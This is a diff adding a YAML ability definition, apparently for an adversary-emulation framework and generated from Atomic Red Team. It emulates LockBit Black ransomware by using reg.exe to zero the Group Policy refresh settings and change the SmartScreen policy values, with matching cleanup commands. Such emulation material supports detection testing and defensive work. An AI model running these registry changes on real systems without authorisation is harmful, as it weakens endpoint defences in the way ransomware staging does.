@@ -1,0 +1,27 @@
+- id: 4adc428b-f60e-4c2c-9653-fb64457d3ad7
+  name: LockBit Black - Modify Group policy settings -reg (Generated from Atomic Red Team)
+  description: |
+    Ability for Domain or Tenant Policy Modification: Group Policy Modification (ATT&CK T1484.001). 
+    Modifies the group policy settings using reg.exe.
+    Generated from Atomic Red Team procedures (9ab80952-74ee-43da-a98c-1e740a985f28); review and test safely before use.
+  tactic: defense-evasion
+  technique:
+    attack_id: T1484.001
+    name: 'Domain or Tenant Policy Modification: Group Policy Modification'
+  platforms:
+    windows:
+      psh:
+        command: |
+          reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v GroupPolicyRefreshTimeDC /t REG_DWORD /d 0 /f;
+          reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v GroupPolicyRefreshTimeOffsetDC /t REG_DWORD /d 0 /f;
+          reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v GroupPolicyRefreshTime /t REG_DWORD /d 0 /f;
+          reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v GroupPolicyRefreshTimeOffset /t REG_DWORD /d 0 /f;
+          reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /t REG_DWORD /d 0 /f;
+          reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v ShellSmartScreenLevel /t REG_SZ /d Block /f;
+        cleanup: |
+          reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v GroupPolicyRefreshTimeDC /f;
+          reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v GroupPolicyRefreshTimeOffsetDC /f;
+          reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v GroupPolicyRefreshTime /f;
+          reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v GroupPolicyRefreshTimeOffset /f;
+          reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /f;
+          reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v ShellSmartScreenLevel /f;
